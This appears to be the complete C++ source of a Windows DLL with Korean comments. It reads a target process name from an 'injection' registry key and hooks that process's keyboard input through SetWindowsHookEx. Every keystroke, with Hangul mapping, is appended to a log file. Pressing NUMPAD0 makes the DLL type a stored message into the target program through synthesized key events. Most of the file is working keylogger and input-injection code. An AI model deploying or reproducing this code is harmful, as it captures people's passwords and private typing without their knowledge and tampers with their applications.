#include "stdio.h"
#include "windows.h"
#include <tlhelp32.h>
#include <locale.h>
HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;
BOOL MessageType = true, pathflag = true;
TCHAR path[200], message[250];
HANDLE hThread = NULL;

#define REG_SUB_KEY L"injection"

#define DLL_EXPORT extern "C" __declspec(dllexport)

void WriteMessage(LPWSTR Message, UINT CodePage = 0)
{
	// 원본 출처: http://boongubbang.tistory.com/255
	TCHAR Word[2];
	TCHAR WordCode[10];
	char MultiByte[10];

	static const BYTE NumCode[10] = { 0x2D, 0x23, 0x28, 0x22, 0x25, 0x0C, 0x27, 0x24, 0x26, 0x21 };
	int Length = wcslen(Message);
	for (int i = 0; i < Length; i++)
	{
		Word[0] = Message[i];
		Word[1] = L'\0';

		if (MessageType) {
			WideCharToMultiByte(CodePage, 0, Word, -1, MultiByte, sizeof(MultiByte), NULL, NULL);
			_itow((int)(((~MultiByte[0]) ^ 0xff) << 8) + ((~MultiByte[1]) ^ 0xff), WordCode, 10);
		}
		else {
			_itow((int)(Word[0]), WordCode, 10);
		}

		keybd_event(VK_MENU, MapVirtualKey(VK_MENU, 0), 0, 0);
		for (int j = 0; j < wcslen(WordCode); j++)
		{
			keybd_event(NumCode[(int)WordCode[j] - 48], MapVirtualKey(NumCode[(int)WordCode[j] - 48], 0), 0, 0);
			keybd_event(NumCode[(int)WordCode[j] - 48], MapVirtualKey(NumCode[(int)WordCode[j] - 48], 0), KEYEVENTF_KEYUP, 0);
		}
		keybd_event(VK_MENU, MapVirtualKey(VK_MENU, 0), KEYEVENTF_KEYUP, 0);
	}
}



void MakeDirectory(LPWSTR full_path)
{
	WCHAR temp[256], *sp;
	lstrcpyW(temp, full_path);
	sp = temp;

	while ((sp = wcschr(sp, L'\\'))) {
		if (sp > temp && *(sp - 1) != L':') {
			*sp = L'\0';
			CreateDirectory(temp, NULL);
			*sp = L'\\';
		}
		sp++;
	}

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	FILE *f1;
	BYTE kb[256];
	WCHAR uc[5] = {};
	BOOL bHangul;

	static WCHAR *alphaToHangul[] = {
		L"ㅁ",L"ㅁ",
		L"ㅠ",L"ㅠ",
		L"ㅊ",L"ㅊ",
		L"ㅇ",L"ㅇ",
		L"ㄷ",L"ㄸ",
		L"ㄹ",L"ㄹ",
		L"ㅎ",L"ㅎ",
		L"ㅗ",L"ㅗ",
		L"ㅑ",L"ㅑ",
		L"ㅓ",L"ㅓ",
		L"ㅏ",L"ㅏ",
		L"ㅣ",L"ㅣ",
		L"ㅡ",L"ㅡ",
		L"ㅜ",L"ㅜ",
		L"ㅐ",L"ㅒ",
		L"ㅔ",L"ㅖ",
		L"ㅂ",L"ㅃ",
		L"ㄱ",L"ㄲ",
		L"ㄴ",L"ㄴ",
		L"ㅅ",L"ㅆ",
		L"ㅕ",L"ㅕ",
		L"ㅍ",L"ㅍ",
		L"ㅈ",L"ㅉ",
		L"ㅌ",L"ㅌ",
		L"ㅛ",L"ㅛ",
		L"ㅋ",L"ㅋ" };

	if (nCode >= 0)
	{
		//	// bit 31 : 0 => press, 1 => release
		if (!(lParam & 0x80000000)) {
			if (pathflag) {
				MakeDirectory(path);
				pathflag = false;
			}
			f1 = _wfopen(path, L"a"); //키보드 로그를 저장할 경로

			bHangul = (GetKeyState(VK_HANGEUL) & 0x0001);
			GetKeyboardState(kb);

			switch (ToUnicode(wParam, MapVirtualKey(wParam, MAPVK_VK_TO_VSC), kb, uc, 4, 0))
			{
			case -1: _putws(L"dead key"); break;
			case  0: _putws(L"no idea!"); break;
			default:
				if (isalpha(uc[0])) {
					if (bHangul) {
						if (uc[0] > 0x60) {
							fwprintf(f1, L"%s", alphaToHangul[(uc[0] - 0x61) * 2]);
						}
						else {
							fwprintf(f1, L"%s", alphaToHangul[(uc[0] - 0x41) * 2 + 1]);
						}
					}
					else {
						fputws(uc, f1);
					}
				}
				else if (uc[0] == 0x000d) {
					fputwc('\n', f1);
				}
				else {
					fputws(uc, f1);
				}
			}
			fclose(f1);

			if (wParam == VK_NUMPAD0) {
				keybd_event(VK_BACK, 0, 0, 0);
				keybd_event(VK_BACK, 0, KEYEVENTF_KEYUP, 0);

				WriteMessage(message);

				keybd_event(VK_RETURN, 0, 0, 0);
				keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
				wParam = VK_RETURN;
			}

		}

	}
	// 일반적인 경우에는 CallNextHookEx() 를 호출하여
	//   응용프로그램 (혹은 다음 훅) 으로 메시지를 전달함
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
#ifndef MAKEULONGLONG
#define MAKEULONGLONG(ldw, hdw) ((ULONGLONG(hdw) << 32) | ((ldw) & 0xFFFFFFFF))
#endif

#ifndef MAXULONGLONG
#define MAXULONGLONG ((ULONGLONG)~((ULONGLONG)0))
#endif

DWORD getTID(int dwProcID)
{
	DWORD dwMainThreadID = 0;
	ULONGLONG ullMinCreateTime = MAXULONGLONG;

	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap != INVALID_HANDLE_VALUE) {
		THREADENTRY32 th32;
		th32.dwSize = sizeof(THREADENTRY32);
		BOOL bOK = TRUE;
		for (bOK = Thread32First(hThreadSnap, &th32); bOK;
			bOK = Thread32Next(hThreadSnap, &th32)) {
			if (th32.th32OwnerProcessID == dwProcID) {
				HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION,
					TRUE, th32.th32ThreadID);
				if (hThread) {
					FILETIME afTimes[4] = { 0 };
					if (GetThreadTimes(hThread,
						&afTimes[0], &afTimes[1], &afTimes[2], &afTimes[3])) {
						ULONGLONG ullTest = MAKEULONGLONG(afTimes[0].dwLowDateTime,
							afTimes[0].dwHighDateTime);
						if (ullTest && ullTest < ullMinCreateTime) {
							ullMinCreateTime = ullTest;
							dwMainThreadID = th32.th32ThreadID; // let it be main... :)
						}
					}
					CloseHandle(hThread);
				}
			}
		}
#ifndef UNDER_CE
		CloseHandle(hThreadSnap);
#else
		CloseToolhelp32Snapshot(hThreadSnap);
#endif
	}

	return dwMainThreadID;
	}

int GetRegStr(HKEY hKeyRoot, LPCWSTR SubKey, LPCWSTR ValueName, LPWSTR Buff, DWORD BuffSize)
{
	BOOL  Rslt = FALSE;
	HKEY  hKey;

	if (RegOpenKey(hKeyRoot, SubKey, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryValueEx(hKey, ValueName, NULL, NULL, (LPBYTE)Buff, &BuffSize) == ERROR_SUCCESS)
			Rslt = TRUE;
		RegCloseKey(hKey);
	}
	return Rslt;
}

int SetRegStr(HKEY hKeyRoot, LPCWSTR SubKey, LPCWSTR ValueName, LPCWSTR ValueStr)
{
	int  Rslt;
	HKEY hKey;

	if ((Rslt = RegOpenKey(hKeyRoot, SubKey, &hKey)) != ERROR_SUCCESS)
		Rslt = RegCreateKey(hKeyRoot, SubKey, &hKey);

	if (Rslt == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, ValueName, 0, REG_SZ, (BYTE*)ValueStr, lstrlen(ValueStr) * 2);
		RegCloseKey(hKey);
	}
	return Rslt == ERROR_SUCCESS;
}

int wstrcmp(LPCWSTR string1, LPCWSTR string2) {

	while (*string1 && *string2)
	{
		if (isascii(*string1) && isascii(*string2)) {
			if (tolower((char)*string1) != tolower((char)*string2))
				return 1;
		}
		else {
			if (*string1 != *string2)
				return 1;
		}
		string1++;
		string2++;
	}

	return 0;

}

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	TCHAR type[10];
	OutputDebugString(L"Log : ThreadProc");
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, getTID((DWORD)lParam));
	while (1) {
		GetRegStr(HKEY_CURRENT_USER, L"injection", L"finish", type, sizeof(type));
		if (wstrcmp(L"true", type) == 0) {
			SetRegStr(HKEY_CURRENT_USER, REG_SUB_KEY, L"finish", L"finish");
			break;
		}
	}
	OutputDebugString(L"Log : ThreadProc is Closed");
	return 0;
}

WORD FindProcessId(const wchar_t *processname)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD result = NULL;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32); // <----- IMPORTANT

										  // Retrieve information about the first process,
										  // and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		OutputDebugString(L"!!! Failed to gather information on system processes! \n");
		return(NULL);
	}

	do
	{
		//printf("Checking process %ls\n", pe32.szExeFile);
		if (0 == wstrcmp(processname, pe32.szExeFile)) 
		{
			result = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return result;
}

DLL_EXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	int pid = 0;
	TCHAR processname[100], type[10];
	_wsetlocale(LC_ALL, L"korean");
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		GetRegStr(HKEY_CURRENT_USER, L"injection", L"processname", processname, sizeof(processname));
		GetRegStr(HKEY_CURRENT_USER, L"injection", L"message", message, sizeof(message));
		GetRegStr(HKEY_CURRENT_USER, L"injection", L"autosave", path, sizeof(path));


		GetRegStr(HKEY_CURRENT_USER, L"injection", L"lang", type, sizeof(type));
		MessageType = wstrcmp(L"unicode", type);

		//SetRegStr(HKEY_CURRENT_USER, L"injection", L"autosave", argv[4]);
		pid = FindProcessId(processname);
		g_hInstance = hinstDLL;

		OutputDebugString(L"Log : DLL_PROCESS_ATTACH");
		hThread = CreateThread(NULL, 0, ThreadProc, (void*)pid, 0, NULL);
		break;

	case DLL_PROCESS_DETACH:
		if (g_hHook)
		{
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}

		OutputDebugString(L"Log : DLL_PROCESS_DETACH");
		break;
	}

	return TRUE;
}